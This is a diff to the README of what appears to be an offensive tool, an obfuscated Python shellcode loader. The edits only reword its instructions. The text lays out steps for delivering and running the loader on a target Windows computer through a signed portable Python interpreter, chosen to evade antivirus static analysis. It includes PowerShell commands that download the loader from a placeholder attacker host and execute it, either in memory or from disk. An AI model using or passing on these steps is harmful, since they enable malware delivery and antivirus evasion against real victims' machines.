@@ -23,7 +23,7 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
 
 - STEP 2. Multiple options exist to download & execute the obfuscated shellcode loader (Python script) on a target Windows computer
 
-  - Option A: Use of a portable signed Python (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
+  - Option A: Utilize a portable signed Python interpreter (www.python.org) + Fileless delivery of the obfuscated shellcode loader (Python script) 
 ```
 1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
     Example:
@@ -44,15 +44,15 @@ C:\path\python-3.10.4> python.exe .\Invoke-Python-ShellCodeLoader.py ".\raw-shel
 
     C:\temp\python> python.exe .\Python-fileless-delivery.py 
 ```
-  - Option B: Use of a portable signed Python (www.python.org) + Download locally the obfuscated shellcode loader (Python script) prior to execution
+  - Option B: Utilize a portable signed Python interpreter (www.python.org) + Download the obfuscated shellcode loader (Python script) locally before execution.
 ```
 1 - Download the Python embeddable package (www.python.org) which provides a signed (portable) Python interpreter with a good reputation.
     Example:
     PS C:\temp> wget -uri https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
     PS C:\temp> tar -xf .\python.zip
 
-2 - Download and store the obfuscated shellcode loader script locally on disk prior to execution with Python.
-    The obfuscation and encryption allow to evade static analysis by most antivirus solutions, though this method may offer reduced stealth compared to in-memory execution.
+2 - Download and store the obfuscated shellcode loader script locally on disk before executing it with Python.
+    While obfuscation and encryption help evade static analysis by most antivirus solutions, this approach may offer reduced stealth compared to in-memory execution.
     Example:
     --------
     C:\temp\python> powershell -c "wget -uri http://X.X.X.X/obfuscated_shellcodeloader.py -OutFile C:\temp\python\obfuscated_shellcodeloader.py"
